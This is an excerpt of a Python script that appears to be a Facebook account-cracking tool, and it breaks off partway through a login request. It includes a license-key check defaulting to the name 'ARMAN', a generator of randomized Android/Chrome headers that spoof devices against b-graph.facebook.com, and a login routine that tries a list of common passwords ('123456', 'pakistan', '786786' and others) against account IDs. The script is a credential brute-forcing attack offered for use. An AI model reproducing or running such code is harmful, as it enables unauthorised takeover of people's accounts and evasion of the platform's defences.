...
def check_key():
    ...
    if not is_valid:
        ...
        if not customer_name: customer_name = "ARMAN"
    ...
    if is_valid and key_data:
        ...
        return key_data.get("name", "ARMAN"), user_key, key_data.get('expiry')
    return None
...
def get_smart_headers():
    ...
    device_models = [
        "SM-S928B", "SM-S918B", "Pixel 7 Pro", "Pixel 8 Pro", 
        "Redmi Note 10 Pro", "CPH2451", "V2230", "M2101K6G"
    ]
    chrome_versions = ["120.0.6099.144", "119.0.6045.163", "121.0.6167.101", "118.0.5993.80"]
    
    rand_android = random.choice(android_versions)
    rand_model = random.choice(device_models)
    rand_chrome = random.choice(chrome_versions)
    
    ua = f"Mozilla/5.0 (Linux; Android {rand_android}; {rand_model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{rand_chrome} Mobile Safari/537.36"
    
    return {
        "Host": "b-graph.facebook.com",
        "Cache-Control": "no-cache",
        "Sec-Ch-Ua": f'"Not_A Brand";v="8", "Chromium";v="{rand_chrome.split(".")[0]}"',
        "Sec-Ch-Ua-Mobile": "?1",
        "Sec-Ch-Ua-Platform": '"Android"',
        "Sec-Ch-Ua-Platform-Version": f'"{rand_android}.0.0"',
...
def login_1(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789', '123123', 'pakistan', '786786', 'qwerty', '112233'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
